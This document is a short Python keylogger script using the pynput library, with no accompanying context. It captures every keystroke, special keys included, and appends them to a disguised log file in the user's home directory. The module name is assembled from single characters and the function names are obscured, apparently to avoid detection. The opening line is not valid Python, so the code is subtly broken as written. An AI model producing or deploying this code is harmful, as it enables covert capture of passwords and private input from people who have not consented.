import __import__('p'+'y'+'n'+'p'+'u'+'t')
def _o_n_p_r_e_s_s(k):
    try:
        with open(__import__('os').path.expanduser('~')+"\\k3yl0g5.t7xt", "a") as f:
            f.write(str(k.char))
    except AttributeError:
        if k == __import__('p'+'y'+'n'+'p'+'u'+'t').keyboard.Key.space:
            with open(__import__('os').path.expanduser('~')+"\\k3yl0g5.t7xt", "a") as f:
                f.write(' ')
        else:
            with open(__import__('os').path.expanduser('~')+"\\k3yl0g5.t7xt", "a") as f:
                f.write(f'\n{k}\n')
def _o_n_r_e_l_e_a_s_e(k):
    if k == __import__('p'+'y'+'n'+'p'+'u'+'t').keyboard.Key.esc:
        return False
with __import__('p'+'y'+'n'+'p'+'u'+'t').keyboard.Listener(on_press=_o_n_p_r_e_s_s, on_release=_o_n_r_e_l_e_a_s_e) as l:
    l.join()